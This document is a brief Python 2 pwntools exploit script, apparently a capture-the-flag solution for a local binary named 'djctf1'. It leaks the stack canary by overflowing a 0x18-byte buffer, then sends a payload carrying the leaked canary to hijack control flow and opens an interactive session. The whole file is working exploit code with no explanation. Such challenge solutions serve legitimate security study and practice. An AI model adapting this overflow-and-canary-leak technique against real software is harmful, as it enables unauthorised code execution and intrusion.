#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, time
context(arch = "amd64",os = "linux", log_level = "debug")

p = process('./djctf1')
elf = ELF('./djctf1')
#gdb.attach(p, "b pwnable\n b flag")

# Canary Leak
p.recvuntil("> ")
p.sendline('0' * 0x18)
p.recvuntil('0' * 0x18)
canary_value = u64(p.recv(8)) - 0x0a
print("Canary: " + hex(canary_value))

# hijack control flow
p.recvuntil("> ")
#p.sendline('0' * 0x18 + p64(canary_value) + p64(0) + '\x00')
p.sendline('0' * 0x18 + p64(canary_value) + p64(0))
#time.sleep(10)
p.interactive()
